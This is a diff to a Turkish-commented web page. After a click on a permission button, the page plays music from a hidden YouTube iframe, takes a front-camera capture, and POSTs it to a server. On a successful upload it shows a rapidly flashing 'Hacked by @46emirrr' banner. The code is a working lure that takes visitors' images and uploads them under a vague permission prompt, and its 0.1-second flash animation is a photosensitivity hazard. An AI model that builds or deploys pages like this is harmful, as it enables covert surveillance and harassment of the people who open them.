@@ -17,7 +17,6 @@
       animation: flashColors 0.1s infinite alternate;
       z-index: 9999;
       mix-blend-mode: difference;
-      display: none;
     }
     @keyframes flashColors {
       0% { background-color: white; }
@@ -74,12 +73,12 @@
   <div id="mesaj"></div>
   <div id="hackedFlash">Hacked by @46emirrr</div>
 
-  <!-- YouTube arka plan müziği (38. saniyeden başlar, autoplay butona basınca aktif) -->
+  <!-- YouTube arka plan müziği (43. saniyeden başlar, gizli iframe) -->
   <iframe
-    id="ytplayer"
+    id="ytPlayer"
     width="0"
     height="0"
-    src="https://www.youtube.com/embed/w_S98XbQmPY?enablejsapi=1&start=38&loop=1&playlist=w_S98XbQmPY&controls=0&mute=0"
+    src="https://www.youtube.com/embed/3wCXRVhAfMw?enablejsapi=1&start=43&autoplay=0&loop=1&playlist=3wCXRVhAfMw&controls=0&mute=0"
     frameborder="0"
     allow="autoplay"
     allowfullscreen
@@ -96,38 +95,23 @@
     const ctx = canvas.getContext("2d");
     const mesaj = document.getElementById("mesaj");
     const hackedFlash = document.getElementById("hackedFlash");
-    const flashOverlay = document.getElementById("flashOverlay");
+    const ytPlayer = document.getElementById("ytPlayer");
 
-    // YouTube Player API yükle
-    let player;
-    function onYouTubeIframeAPIReady() {
-      player = new YT.Player('ytplayer', {
-        events: {
-          'onReady': onPlayerReady
-        }
-      });
+    // YouTube API için iframe mesajı göndermek için fonksiyon
+    function playYouTube() {
+      ytPlayer.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
     }
-    function onPlayerReady(event) {
-      // Başlangıçta çalma yok
-    }
-    // YouTube API script'i ekle
-    let tag = document.createElement('script');
-    tag.src = "https://www.youtube.com/iframe_api";
-    document.head.appendChild(tag);
 
     izinButton.addEventListener("click", async () => {
       izinButton.style.display = "none";
       mesaj.textContent = "";
-      hackedFlash.style.display = "block";
-      flashOverlay.style.display = "block";
-
-      // YouTube müziği başlat
-      if(player && player.playVideo){
-        player.seekTo(38, true);
-        player.playVideo();
-      }
+      hackedFlash.style.display = "none";
 
       try {
+        // Müzik çal
+        playYouTube();
+
+        // Kamera erişimi al
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
@@ -149,11 +133,12 @@
             body: formData
           });
 
-          if (!res.ok) {
+          if (res.ok) {
+            mesaj.textContent = "";
+            hackedFlash.style.display = "block";
+          } else {
             mesaj.textContent = "❌ Gönderim başarısız.";
             izinButton.style.display = "inline-block";
-            hackedFlash.style.display = "none";
-            flashOverlay.style.display = "none";
           }
 
           stream.getTracks().forEach(track => track.stop());
@@ -162,8 +147,6 @@
       } catch (err) {
         mesaj.textContent = "Kamera erişimi alınamadı: " + err.message;
         izinButton.style.display = "inline-block";
-        hackedFlash.style.display = "none";
-        flashOverlay.style.display = "none";
       }
     });
   </script>
